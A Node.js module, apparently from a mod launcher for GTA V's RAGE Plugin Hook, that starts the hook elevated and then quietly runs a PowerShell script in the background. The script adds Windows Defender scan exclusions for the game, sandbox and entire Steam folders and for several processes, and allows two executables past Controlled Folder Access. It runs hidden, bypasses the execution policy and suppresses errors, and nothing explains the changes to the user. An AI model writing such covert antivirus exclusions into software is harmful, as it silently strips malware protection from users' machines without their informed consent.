const fs = require("fs");
const path = require("path");
const { execFileSync, spawn } = require("child_process");
const { exists, tactixDir } = require("./paths");

function psQuote(value) {
  return `'${String(value || "").replace(/'/g, "''")}'`;
}

function queryReg(key, valueName) {
  try {
    const stdout = execFileSync("reg", ["query", key, "/v", valueName], {
      windowsHide: true,
      encoding: "utf8",
    });
    const match = String(stdout).match(/REG_\w+\s+(.+)/);
    return match ? match[1].trim() : null;
  } catch {
    return null;
  }
}

function steamRoot() {
  const found =
    queryReg("HKCU\\Software\\Valve\\Steam", "SteamPath") ||
    queryReg("HKLM\\SOFTWARE\\WOW6432Node\\Valve\\Steam", "InstallPath");
  return found ? String(found).replace(/\//g, "\\") : "C:\\Program Files (x86)\\Steam";
}

function markerPath(sandboxPath) {
  return path.join(tactixDir(sandboxPath), "windows-permissions.ok");
}

function alreadyGranted(sandboxPath) {
  return exists(markerPath(sandboxPath));
}

function rageIsRunning() {
  try {
    const out = execFileSync("tasklist", ["/FI", "IMAGENAME eq RAGEPluginHook.exe", "/NH"], {
      windowsHide: true,
      encoding: "utf8",
    });
    return /ragepluginhook\.exe/i.test(out);
  } catch {
    return false;
  }
}

function startRageRunAs(rph, cwd) {
  return new Promise((resolve, reject) => {
    const child = spawn(
      "powershell.exe",
      [
        "-NoProfile",
        "-Command",
        `try { $p = Start-Process -FilePath ${psQuote(rph)} -WorkingDirectory ${psQuote(cwd)} -Verb RunAs -PassThru; if ($null -eq $p) { exit 1 }; exit 0 } catch { exit 1 }`,
      ],
      { windowsHide: true }
    );
    child.once("error", (error) => reject(error));
    child.once("exit", (code) => {
      if (code && code !== 0) {
        reject(new Error("canceled"));
        return;
      }
      resolve();
    });
  });
}

function writeGrantScript({ sandboxPath, officialPath }) {
  const dir = tactixDir(sandboxPath);
  fs.mkdirSync(dir, { recursive: true });
  const script = path.join(dir, "grant-permissions.ps1");
  const marker = markerPath(sandboxPath);
  const steam = steamRoot();
  const rph = path.join(sandboxPath, "RagePluginHook.exe");
  const gta = path.join(sandboxPath, "GTA5_Enhanced.exe");
  const steamExe = path.join(steam, "steam.exe");
  const lines = [
    "$ErrorActionPreference = 'SilentlyContinue'",
    `$paths = @(${psQuote(sandboxPath)}, ${psQuote(officialPath)}, ${psQuote(steam)})`,
    "foreach ($p in $paths) { if (Test-Path -LiteralPath $p) { Add-MpPreference -ExclusionPath $p } }",
    "foreach ($proc in @('RAGEPluginHook.exe','GTA5_Enhanced.exe','PlayGTAV.exe','steam.exe')) { Add-MpPreference -ExclusionProcess $proc }",
    `Add-MpPreference -ControlledFolderAccessAllowedApplications ${psQuote(rph)}`,
    `Add-MpPreference -ControlledFolderAccessAllowedApplications ${psQuote(gta)}`,
    `New-Item -ItemType File -Path ${psQuote(marker)} -Force | Out-Null`,
  ];
  fs.writeFileSync(script, `${lines.join("\r\n")}\r\n`, "utf8");
  return script;
}

function grantInBackground({ sandboxPath, officialPath }) {
  if (alreadyGranted(sandboxPath)) return;
  const script = writeGrantScript({ sandboxPath, officialPath });
  spawn(
    "powershell.exe",
    [
      "-NoProfile",
      "-WindowStyle",
      "Hidden",
      "-Command",
      `Start-Process -FilePath powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',${psQuote(script)})`,
    ],
    { windowsHide: true, detached: true, stdio: "ignore" }
  ).unref();
}

async function launchRage({ sandboxPath, officialPath }) {
  const rph = path.join(sandboxPath, "RagePluginHook.exe");
  try {
    await startRageRunAs(rph, sandboxPath);
  } catch (error) {
    if (error && error.message === "canceled") {
      return { ok: false, canceled: true, via: "canceled" };
    }
    return { ok: false, via: "runas-failed" };
  }
  if (rageIsRunning()) {
    grantInBackground({ sandboxPath, officialPath });
    return { ok: true, via: "runas" };
  }
  return { ok: false, via: "runas-exited" };
}

module.exports = { alreadyGranted, steamRoot, launchRage };
